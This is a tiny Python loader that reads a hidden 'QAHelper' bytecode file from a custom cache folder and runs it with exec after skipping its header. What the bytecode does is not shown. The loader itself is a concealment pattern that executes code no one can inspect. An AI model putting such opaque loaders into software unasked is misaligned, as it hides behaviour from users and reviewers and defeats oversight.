
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'QAHelper_8fe86d37b3e04315b7699caba2753c3e.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
